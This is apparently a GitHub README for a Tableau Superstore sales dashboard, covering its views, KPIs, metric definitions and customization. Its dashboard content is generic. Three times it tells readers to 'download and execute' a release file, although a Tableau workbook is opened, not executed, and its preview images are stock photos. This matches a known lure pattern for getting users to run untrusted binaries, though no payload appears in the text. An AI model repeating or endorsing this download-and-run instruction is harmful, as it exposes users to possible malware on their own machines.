[![Releases - Download](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/lmn1905/superstore-sales-dashboard-tableau/releases)

# Superstore Sales Dashboard — Tableau BI, KPIs, Trends & Insights

Interactive Tableau dashboard for analyzing Superstore sales, profit trends, top products, customer segments, and regional performance. Use the release bundle to open the packaged workbook and explore the views.

[Repository Releases — download and execute the release file](https://github.com/lmn1905/superstore-sales-dashboard-tableau/releases)

<!-- Images -->
![Dashboard preview](https://images.unsplash.com/photo-1556157382-97eda2d62296?w=1200&q=80)
![Analytics illustration](https://images.unsplash.com/photo-1555949963-aa79dcee981d?w=1200&q=80)

Table of Contents
- Overview
- Features
- Dashboard views
  - Sales Overview
  - Profit Trends
  - Top Products & Categories
  - Customer Segments
  - Regional Performance
  - Time-series & Forecast
- Data and files
- Install and run (download & execute)
- How to use the dashboard
- KPIs and metric definitions
- Customization and extension
- Performance tips
- Troubleshooting
- Contributing
- License
- Topics and tags

Overview
This repository holds an interactive Tableau dashboard built on the Superstore dataset. It focuses on core retail questions: where we make sales, where we lose profit, which items drive revenue, and which customer types respond best. The dashboard combines clear KPIs, filter-driven exploration, and story-driven charts for business users and analysts.

Goals
- Surface sales and profit trends across time and region.
- Highlight best and worst products by revenue and margin.
- Profile customer segments and their value.
- Provide actionable regional and category insights.
- Deliver a reusable Tableau workbook that teams can adapt.

Features
- Clean KPI header showing Sales, Profit, Profit Ratio, Orders, and Avg Order Value.
- Interactive filters: date range, region, category, sub-category, segment, and state.
- Multi-sheet layout: maps, bar charts, treemaps, line charts, and detail tables.
- Drill-down capability from category to sub-category to product.
- Built-in top-N selectors and trend smoothing option.
- Export-friendly: image and data download from Tableau.
- Configurable color palettes and thresholds for alerts.

Dashboard views

Sales Overview
- High-level KPIs show sales, profit, and orders.
- Year-over-year and quarter-over-quarter comparisons.
- Sales by channel and category breakdown.
- A stacked bar view compares category mix over time.

Profit Trends
- Line chart of profit and profit ratio across months.
- Waterfall view shows contribution by category to profit change.
- Identify margin erosion and rising cost centers.

Top Products & Categories
- Top N products by sales and by profit.
- Treemap for category and sub-category share.
- Table with product-level sales, profit, quantity, and margin.
- Toggle to view units vs revenue ranking.

Customer Segments
- Segment-level revenue and profit breakdown (Consumer, Corporate, Home Office).
- Cohort-style view by first-order date.
- Average lifetime value and repeat purchase rate.
- Customer map showing density of key accounts.

Regional Performance
- Choropleth map by state showing sales and profit ratio.
- Regional comparison with normalized metrics (sales per store simulated).
- Identify underperforming states with high sales and low profit.

Time-series & Forecast
- Monthly trend lines with optional trendline.
- Simple forecast model for next 3 to 12 months (Tableau built-in).
- Seasonality flags for peak months.

Data and files
- The dashboard uses the Superstore dataset schema: Orders, Returns, People, and Regions.
- The main packaged workbook is in the Releases section as a .twbx (Tableau Packaged Workbook) or as a .twb plus data files.
- If you use your own data, adapt the fields:
  - Order ID, Order Date, Ship Date
  - Customer ID, Customer Name, Segment
  - Product ID, Product Name, Category, Sub-Category
  - Sales, Quantity, Discount, Profit
  - Region, State, City

Install and run (download & execute)
- Visit the releases page and download the packaged workbook. The release bundle contains the workbook and sample exports.
- Download and execute the release file from https://github.com/lmn1905/superstore-sales-dashboard-tableau/releases
- Open the .twbx in Tableau Desktop (recommended) or Tableau Reader. If the release contains a .twb, place the data extracts next to the .twb before opening.
- To publish, use Tableau Server or Tableau Public with your account credentials.

How to use the dashboard
- Use the date slider to limit the analysis window.
- Apply region and category filters to focus the view.
- Click a state on the map to filter other charts to that state.
- Use the top-N selector to change the product ranking.
- Hover over marks for tooltips with context and sparkline mini-charts.
- Export the current view as an image or download the underlying data table.

KPIs and metric definitions
- Sales: Sum of price * quantity after discount.
- Profit: Sales minus cost (profit field in dataset).
- Profit Ratio: Profit / Sales expressed as a percentage.
- Avg Order Value (AOV): Sales / number of orders.
- Units per Order: Quantity / number of orders.
- Repeat Purchase Rate: Customers with more than one order / total customers.
- Lifetime Value (LTV): Sum of profit per customer over time window.

Customization and extension
- Replace the sample data with your own CSV or database connection. Map your fields to the expected schema.
- Add calculated fields for your business logic:
  - Gross Margin = Profit / Sales
  - Net Contribution = Profit - Marketing Cost (add if you have marketing spend)
- Extend the forecast: swap Tableau built-in forecast with an external model and import predictions as a data source.
- Add parameter controls for scenario analysis (price changes, discount changes).
- Internationalize: swap currency formats and date localization in worksheet formatting.

Performance tips
- Use extracts (.hyper) for large data to speed up joins and calculations.
- Limit quick filters to relevant values or use context filters to reduce compute.
- Pre-aggregate at the month or week level if you do not need row-level detail.
- Optimize table calculations by using LOD expressions where possible.
- Reduce the number of marks on maps by aggregating to state or region for high-level views.

Troubleshooting
- If a view shows no data, confirm data source connection and field names match expected schema.
- If maps fail to load, check the geographic role on location fields (State, City).
- If the workbook runs slow, switch to extract mode and test with a smaller date range.
- If a release file fails to open, download it again from the releases page and verify file integrity.

Contributing
- Use issues for bug reports or feature requests.
- Open a pull request with a clear description and screenshots for visual changes.
- Follow the repository topics and naming conventions for new sheets and data sources.
- Keep changes focused: one feature per PR helps review and testing.

License
- The project uses the MIT License. See LICENSE.md for full terms.

Releases and downloads
- The packaged workbook lives in the Releases section. Download and execute the release file to open the dashboard locally: https://github.com/lmn1905/superstore-sales-dashboard-tableau/releases
- If the release contains multiple files, the main workbook is labeled with the version and ends with .twbx.

FAQ
Q: What do I need to view the dashboard?
A: Tableau Desktop or Tableau Reader can open .twbx files. For publishing, use Tableau Server or Tableau Public.

Q: Can I use my own data?
A: Yes. Map your fields to the expected schema and replace the Superstore source with your connection. Adjust calculated fields as needed.

Q: Can I change the visual theme?
A: Yes. Edit the workbook color palette and font settings, or apply a custom style workbook.

Topics and tags
business-intelligence, data-storytelling, data-visualization, kpi-dashboard, profit-analysis, retail-analysis, sales-dashboard, superstore, tableau, tableau-dashboard

Contact and support
- Open an issue for bugs or questions.
- Use pull requests for improvements and new views.
- Include screenshots and sample data when possible to speed review.